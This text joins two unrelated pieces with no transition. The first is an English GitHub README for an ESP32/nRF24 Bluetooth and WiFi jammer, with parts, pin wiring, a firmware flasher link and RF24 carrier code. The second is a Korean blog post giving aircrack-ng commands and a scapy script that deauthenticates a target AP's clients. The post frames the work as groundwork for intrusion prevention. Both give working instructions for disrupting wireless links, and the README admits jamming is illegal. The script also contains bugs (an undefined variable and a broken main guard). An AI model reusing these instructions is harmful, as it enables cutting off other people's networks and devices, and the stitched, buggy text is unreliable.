# Cypher Jammer

### Open-source Wireless Jamming Pentesting Device using ESP32-WROOM-32D & 2 NRFL01+PA+LNA Modules

### Designed to also work with a flipper zero, and has some extra pins to add other modules!

### Order my PCB from PCBWay & get a $10 coupon ^_^ : https://pcbway.com/g/87Pi52

### All thanks to the lovely Smoochie, please check out his work, especially Noisy Boy! This PCB has the same pins so you can test his firmware.

<img src="image/cypher_jammer1.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">
<img src="image/cypher_jammer2.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">
<img src="image/cypher_jammer3.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">
<img src="image/cypher_jammer4.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">
<img src="image/cypher_jammer5.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">
<img src="image/cypher_jammer6.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">
<img src="image/cypher_jammer7.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">
<img src="image/cypher_jammer8.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">
<img src="image/cypher_jammer9.JPG" alt="Wifi and Bluetooth jammer made with an esp32 and nrf24l01+pa+lna modules." width="400" height="600">

![smoochieeBLEheaderIMG](https://github.com/smoochiee/Ble-jammer/assets/30816448/8c160045-5e4c-4ad4-ae91-471beade94ba)


 
 **WARNING!!! JAMMING IS ILLEGAL**
 ---
# FOR UPDATED CODES AND FEATURE GO HERE [NOISY BOY](https://github.com/smoochiee/Noisy-boy-esp32-Bluetooth-jammer)

# WHAT DOES IT DO?

**IT CREATES NOISE SIGNAL TO JAM BLUETOOTH AND WIFI USING NRF24L01 AND ESP32 IN RANGE 2.4GHZ DEVICES , EFFECTS MAY VARY DEPENDS ON DEVICE BLUETOOTH VERSIONS **


`NOT TESTED ON 2.4GHZ DRONE I DONT HAVE ONE BUT IT CAN JAM ONE..... MAYBE?` 
---


---
## REQUIRED DEVICE AND MODULE:
1. `1pc OR 2pcs NRF24`
- ![nrf24l01](https://github.com/smoochiee/Ble-jammer/assets/30816448/c370e76d-d518-409a-ba87-cb087183958c)

2. `1pc ESP32` NOTE... YOU CAN USE A `NANO OR MICRO` BUT ESP32 ARE CHEAP ALMOST SAME PRICE AS `ARDUINOS`...LOL
- ![esp32](https://github.com/smoochiee/Ble-jammer/assets/30816448/840c5d23-a6cd-4c9b-90b5-911c3d29d8e4)


3. `10UF-100UF CAPACITOR DEPEND ON YOUR NRF` 
- ![capacitor](https://github.com/smoochiee/Ble-jammer/assets/30816448/7165fcb1-bb05-4aa4-8dee-5640118b2673)

4.` 1 DIP SWITCH` (OPTIONAL IF YOU WANT TO USE DIFFERENT PATTERN OF CHANNEL HOPPING)
- ![DIP](https://github.com/smoochiee/Ble-jammer/assets/30816448/cec3ed8d-6db0-4c9a-9d20-de72abbf9c58)


---


 ## PINS TO ATTACH NRF24L01 TO ESP32

### FOR DUAL/TWO NRF24L01 
+ ` HSPI= SCK = 14, MISO = 12, MOSI = 13, CS = 15 , CE = 16`
+ ` VSPI= SCK = 18, MISO =19, MOSI = 23 ,CS =21 ,CE = 22`

### FOR SINGLE/ONE NRF24L01 YOU CAN CHOOSE BETWEEN HSPI OR VSPI 
 - `VSPI= SCK = 18, MISO =19, MOSI = 23 ,CS =21 ,CE = 22`
- `HSPI= SCK = 14, MISO = 12, MOSI = 13, CS = 15 , CE = 16` 

### SWITCH PIN (OPTIONAL)
- `PIN 33 OF YOUR ESP32 `
---
## WIRING DIAGRAM


### NRF24L01 PINS
- ![NRF24L01 PIN](https://github.com/smoochiee/Ble-jammer/assets/30816448/e41779d4-565a-4044-9b88-c0acbea0e93e)

### ESP32 PINS WHERE YOU ATTACH YOUR `NRF24` AND `SWITCH `
- ![32](https://github.com/smoochiee/Ble-jammer/assets/30816448/ba7c2991-1542-4296-8b8c-8011c2bc8e77)




### HOW YOU ATTACH CAPACITOR LOOK OUT FOR POLAROITY SIGNS `- +`
- ![NRF24 CAPACITOR](https://github.com/smoochiee/Ble-jammer/assets/30816448/bf24b643-7b70-4d73-962a-38fa0bffe30f)


--- 

## UPLOADING CODE TO ESP32

- ` WEBFLASHER `INSTALLER FOR EASY UPLOAD CODE ON ESP32 NO NEED TO DOWNLOAD INO FILE (USE CHROME OR MICROSOFT BROWSER)

 [WEBFLASHER](https://smoochiee.github.io/Bluetooth-jammer-esp32/flash1) HERE....SELECT WHAT TO UPLOAD `VSPI,HSPI OR DUAL` AND CHOOSE RIGHT `COM PORT`


---


## DEMO


+ **TESTED 10 METERS ON BLUETOOTH 5.0 AND WORKS GREAT**
+ **TESTED 10 METERS ON NEWER BLUETOOTH 5.3 WORKING DEPENDS BETWEEN THE GAP OF BLUETOOTH DEVICE AND PHONE**
+ + **IF YOU WANT BETTER PERFORMANCE YOU CAN ADD 2.4GHZ RF AMPLIFIER** 

- https://github.com/smoochiee/Ble-jammer/assets/30816448/16f0c1f8-6f23-4cca-a352-f6ff64fe5a90

---

## COMPILING USING IDE (IF YOUR NOT USING WEBFLASHER)

* DOWNLOAD LIBRARIES YOU NEED AND INSTALL [RF24 LIBRARY](https://github.com/nRF24/RF24) AND [EZBUTTON LIBRARY](https://arduinogetstarted.com/tutorials/arduino-button-library)
* DOWLOAD CODE [INO FILE](https://github.com/smoochiee/Ble-jammer/tree/main/INO)

---


## SOME NOTES

* NRF24 CAN DO 125 CHANNELS YOU CAN EDIT IT IN CODE
- BLUETOOTH CLASSIC 80 CHANNELS
+ BLE USES 40 CHANNELS
* WIFI USES 1-14 CHANNELS
* DRONE 2.4GHZ 1-125 SO YOU NEED TO EDIT CODE TO HOPE 125 CHANNELS
* YOU CAN EDIT PAYLOAD SIZE DIRECTLY ON RF24 LIBRARY  `RF24.CPP LINE # 1972`
```
/****************************************************************************/
void RF24::startConstCarrier(rf24_pa_dbm_e level, uint8_t channel)
{
    stopListening();
    write_register(RF_SETUP, read_register(RF_SETUP) | _BV(CONT_WAVE) | _BV(PLL_LOCK));
    if (isPVariant()) {
        setAutoAck(0);
        setRetries(0, 0);
        uint8_t dummy_buf[5];
        for (uint8_t i = 0; i < 5; ++i)
            dummy_buf[i] = 0x00;

        // use write_register() instead of openWritingPipe() to bypass
        // truncation of the address with the current RF24::addr_width value
        write_register(TX_ADDR, reinterpret_cast<uint8_t*>(&dummy_buf), 5);
        flush_tx(); // so we can write to top level

        // use write_register() instead of write_payload() to bypass
        // truncation of the payload with the current RF24::payload_size value
        write_register(W_TX_PAYLOAD, reinterpret_cast<const uint8_t*>(&dummy_buf), 5);

        disableCRC();
    }
    setPALevel(level);
    setChannel(channel);
    IF_SERIAL_DEBUG(printf_P(PSTR("RF_SETUP=%02x\r\n"), read_register(RF_SETUP)));
    ce(HIGH);
    if (isPVariant()) {
        delay(1); // datasheet says 1 ms is ok in this instance
        ce(LOW);
        reUseTX();
    }
}

/****************************************************************************/

```






---
IF YOU DO MODIFY CODES OR MAKE IT YOUR OWN PLEASE DO CREDITS FROM OWNER.NOT ACT LIKE YOU OWN...A THANKS OR DONATIONS WOULD BE NICE...to whom claiming they wrote the codes Do note that its already a working code. when you wrote it from scratch..lol..😂
---
# DONATION
**If you like you can donate to MY PAYPAL ACCOUNT :**


[PAYPAL](https://paypal.me/smoochieelee?country.x=PH&locale.x=en_US)
or
[GCASH](https://github.com/smoochiee/Ble-jammer/blob/main/GCash-MyQR-16032024181536.PNG.jpg)


<a href="https://www.buymeacoffee.com/smoochiee"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=smoochiee&button_colour=FFDD00&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=ffffff" /></a>



# SPECIAL THANKS FOR DONATORS
  * [ATOMNFT](https://github.com/ATOMNFT) - HEADER AND DONATIONS
  * DONATIONS
  * PARROTSTORE
  * Sok Ponleu
  * Philipp Simon

이 글은 허가되지 않은 장치의 무선 연결을 막는 무선 침입방지(WIPS, Wireless Intrusion Prevention System) 장치를 제작하기 위해 만들어졌다.
허가되지 않은 공격은 불법이며 이로 인한 책임은 오로지 공격자가 져야 함을 분명히 밝힌다.

deauth 공격을 통해 특정 AP와 통신하는 단말의 WiFi 연결을 재밍해보았다.
deauth는 WiFi 프로토콜에서 연결 종료를 일으키는 패킷이다.
Wikipedia에서도 설명돼있듯 아주 잘 알려진 공격 기법이며 아직까지 해결방법이 나오지 않은 방법이기도 하다.
AP에게 deauth 패킷을 전송하면 AP는 클라이언트와의 연결을 종료한다.


from Wikipedia
원래는 라즈베리파이로 재밍 하드웨어를 만드려고 했으나, 필자가 가진 라즈베리파이3의 WiFi 칩셋으로는 deauth 재밍이 불가능했다.
필자가 확인하기로는 라즈베리파이3의 WiFi 칩셋(BCM43438, a.k.a. BCM43430a1)이 무선 해킹에 사용할 수 있는 것 같은데 [nexmon], 직접 테스트해본 결과 무선 신호를 감청할 수는 있으나 송출하는 건 불가능했다.
이유를 생각해보니 필자가 가진 WiFi 카드는 USB 3.0을 사용하는 반면 라즈베리파이3은 USB 3.0을 지원하지 않는다.
무선 신호 송출은 감청과 달리 에너지가 많이 필요하기에 전력량이 부족한 USB 2.0으로는 불가능했던 게 아닌가 강하게 의심된다. (애초에 장치부터 정상적으로 인식되지 않는다)
어쩔 수 없이 VMware에 kali linux를 설치하여 테스트하였다.

당연히 무선 감청이 가능한 WiFi 카드를 구매해야 한다.
필자는 WiFi를 통한 모의 해킹에 자주 사용되는 FU-AX1800을 사용하였다.
칩셋은 MT7921u이다.

kali linux 설치 후 WiFi 수신기를 연결하면 다음처럼 수신기가 정상적으로 인식되었다는 결과를 확인할 수 있다. (dmesg)
참고로 USB 3.0을 지원하지 않는 라즈베리파이3에서는 기기 정보를 거의 인식하지 못했다.


이제 테스트의 시간이다.
먼저 airmon을 사용하여 하드웨어가 deauth 공격을 수행할 수 있는지 확인한다.

$ sudo airmon-ng start wlan0  # 무선 어댑터 모니터 모드 전환
$ sudo airodump-ng --essid "YOUR_SSID" wlan0mon  # SSID를 통한 감청 수행
$ sudo aireplay-ng --deauth 0 -a "AP_MAC" wlan0mon  # 감청을 통해 알아낸 정보를 바탕으로 deauth 공격을 수행한다.
$ sudo airmon-ng stop wlan0mon  # 무선 어댑터 매니지 모드 전환
파이썬을 이용해 스크립트로 deauth 공격을 수행해본다.

from scapy.all import *
import time
import subprocess
import threading
import atexit
# 무선 인터페이스 이름 (실제 인터페이스 이름으로 변경 필요)
manager_interface = "wlan0"
monitor_interface = "wlan0mon"
# 대상 SSID
target_ssid = "YOUR_SSID"  # 공격하려는 네트워크의 SSID로 변경하세요
channels = range(1, 15)  # 2.4GHz 채널 (필요 시 5GHz 채널도 추가 가능)
# 허용 스테이션
allowed_clients = ["AA:BB:CC:DD:EE:FF"]
# 설정
attack_count = 50
def enable_monitor_mode():
    subprocess.run(["sudo", "airmon-ng", "start", manager_interface], check=True)
    print(f"{manager_interface}가 모니터 모드로 전환되었습니다.")
def disable_monitor_mode():
    subprocess.run(["sudo", "airmon-ng", "stop", monitor_interface], check=True)
    print(f"{manager_interface}가 관리 모드로 복구되었습니다.")
def get_ap_info(ssid):
    ap_set = {}
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            if pkt.info.decode() == ssid:
                if pkt.addr3 not in [ap[0] for ap in ap_list]:
                    ap_set.add((pkt.addr3, pkt.channel))
    
    print(f"Scanning for AP with SSID: {ssid}")
    sniff(iface=monitor_interface, prn=packet_handler, timeout=10)
    return ap_set
def main():
    try:
        # 채널 호핑 스레드 시작
        stop_event = threading.Event()
        def channel_hopper():
            while not stop_event.is_set():
                for channel in channels:
                    os.system(f"iwconfig {monitor_interface} channel {channel}")
                    time.sleep(0.5)
        channel_thread = threading.Thread(target=channel_hopper)
        channel_thread.daemon = True
        channel_thread.start()
        # 패킷 스니핑 시작
        ap_info = {}
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                if pkt.info.decode() == target_ssid:
                    ssid = pkt.info.decode()
                    bssid = pkt.addr2
                    mac = pkt.addr3
                    try:
                        channel = int(ord(pkt[Dot11Elt:3].info))
                    except:
                        channel = None
                    ap_info['ssid'] = ssid
                    ap_info['bssid'] = bssid
                    ap_info['channel'] = channel
                    ap_info['mac'] = mac
                    # AP 정보를 찾았으므로 스니핑 중지
                    raise KeyboardInterrupt
        
        print(f"Scanning for SSID: {target_ssid}")
        sniff(iface=monitor_interface, prn=packet_handler, timeout=10)
        if "channel" not in ap_info:
            raise Exception("SSID is not found.")
        # AP MAC & channel 취득
        ap_mac = ap_info['mac']
        channel = ap_info['channel']
        print(f"Found AP: {ap_mac} on channel {channel}")
        # 채널 호핑 종료
        stop_event.set()
        channel_thread.join()
        os.system(f"iwconfig {monitor_interface} channel {channel}")
        
        # 클라이언트 탐색 및 deauth 공격
        clients = set()
        def client_scan(pkt):
            if pkt.haslayer(Dot11):
                if pkt.addr2 == ap_mac and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
                    clients.add(pkt.addr1)
        print("Scanning for clients...")
        sniff(iface=monitor_interface, prn=client_scan, timeout=10)
        print(f"Found {len(clients)} clients")
        def deauth_attack(ap_mac, client_mac):
            deauth_packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
            sendp(deauth_packet, iface=monitor_interface, count=attack_count, inter=0.1, verbose=0)
        for client in clients:
            if client not in allowed_clients:
                print(f"Deauthenticating {client}")
                deauth_attack(ap_mac, client)
    except KeyboardInterrupt:
        print("\nDeauth attack stopped")
if name == "main":
    enable_monitor_mode()
    atexit.register(disable_monitor_mode)
    try:
        main()
    except Exception as exp:
        print(f'{exp}')
    finally:
        print("Restoring network interface...")
코드는 설명할 것도 없이 단순하다.
기본적으로 airmon을 통해 감청과 송신을 수행한다.
채널을 호핑하며 SSID에 해당하는 AP 정보를 찾고, 해당 AP와 통신하는 스테이션의 MAC을 찾아 deauth 공격을 수행한다.

참고로 scapy는 GPL v2 라이선스를 사용한다.
상용 솔루션을 만들고 싶다면 BSD 라이선스를 사용하는 dpkt 패키지를 사용해야 한다.
다만 dpkt 패키지가 무척 저수준이기 때문에 포팅이 쉽지 않다.
만약 포팅한다면 위 코드를 래핑하여 라이브러리 종속성을 분리하는 것을 추천한다.

deauth 공격을 당하는 경우 “비밀번호가 잘못되었다”는 오류가 발생하며 WiFi 연결이 끊어진다.
